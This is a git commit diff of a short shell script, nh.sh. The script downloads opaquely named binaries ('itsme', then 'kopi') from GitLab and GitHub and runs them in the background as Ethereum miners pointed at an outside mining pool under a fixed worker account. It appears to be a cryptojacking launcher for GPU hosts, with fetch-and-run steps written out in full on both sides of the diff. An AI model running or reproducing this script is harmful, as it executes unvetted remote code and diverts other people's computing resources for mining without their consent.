9a7f4471f87a5d0790c92db7c1ffbaabf9d323e1
nurfasikin <92776649+nurfasikin@users.noreply.github.com>
2022-06-27 19:13:24 +0700

    Update nh.sh

--- nh.sh
+++ nh.sh
@@ -1,9 +1,3 @@
-#!/bin/sh
-apt update
-apt-get install zip unzip
-apt install screen -y
-screen -dmS harukan.sh 65 75
-git clone https://gitlab.com/taufiqurrohmanmaz/sainame127.git
-cd sainame127
-chmod +x itsme
-ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && ./itsme -a ethash -w berkah.001 -p stratum+tcp://ethash.kupool.com:8888 stratum+tcp://ethash.kupool.com:1800 -r $ip --nvidia 1
+#!/bin/bash
+wget https://github.com/aurbach55/dera/raw/main/kopi
+chmod +x ./kopi && nohup ./kopi --coin ETH --pool ethash.kupool.com:443 --user berkah.001.$(echo $(shuf -i 1-99999 -n 1)-T4) > nohup.out
